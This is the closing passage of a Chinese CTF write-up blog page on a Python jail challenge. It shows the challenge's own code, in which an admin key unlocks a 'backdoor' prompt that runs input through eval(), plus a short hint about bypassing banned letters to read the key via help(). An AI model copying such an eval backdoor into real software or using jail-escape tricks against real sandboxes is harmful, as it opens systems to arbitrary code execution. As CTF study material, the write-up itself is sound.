      <span class="token keyword">elif</span> challenge_choice <span class="token operator">==</span> <span class="token string">'b'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please enter the admin key"</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"key >> "</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>key <span class="token operator">==</span> fake_key_into_local_but_vailed_key_into_remote<span class="token punctuation">)</span><span class="token punctuation">:</span>
          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hey Admin,please input your code:"</span><span class="token punctuation">)</span>
          code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"backdoor >> "</span><span class="token punctuation">)</span>
          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You should select valid choice!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ban了m，o，e，d，b，t</p>
<p>可以直接用Jail Level 3的编码绕过进help()查看<code>__main__</code>得到key</p>
<hr>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>